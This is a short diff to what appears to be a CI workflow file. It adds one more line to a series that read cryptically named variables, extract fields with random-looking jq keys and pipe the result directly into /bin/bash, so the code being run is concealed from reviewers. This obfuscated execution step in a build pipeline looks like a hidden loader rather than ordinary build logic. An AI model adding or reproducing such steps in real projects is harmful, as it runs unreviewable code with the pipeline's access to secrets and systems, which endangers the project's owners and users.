@@ -21,6 +21,7 @@ jobs:
           echo $h4 | jq -r .h84953 | /bin/bash
           echo $lyepy1 | jq -r .lerkf45500 | /bin/bash
           printf '%s' "$d9308" | jq -r .w31 | /bin/bash
+          printf '%s' "$hxg0405" | jq -r .m09 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
